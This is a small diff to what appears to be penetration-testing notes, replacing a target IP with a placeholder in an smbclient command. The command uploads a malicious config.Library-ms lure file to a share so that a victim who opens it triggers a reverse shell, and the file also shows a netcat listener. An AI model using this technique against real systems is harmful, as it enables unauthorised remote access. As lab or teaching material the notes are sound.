@@ -43,7 +43,7 @@ nc -nlvp 4444
 We can now transfer `config.Library-ms` via smbclient to the target share and hopefully some user will open the file:
 
 ```bash
-smbclient //192.168.50.195/sharename -c 'put config.Library-ms' -U 'user%pass'
+smbclient //IP/sharename -c 'put config.Library-ms' -U 'user%pass'
 ```
 
 If a user opens the file, we will get a reverse shell.
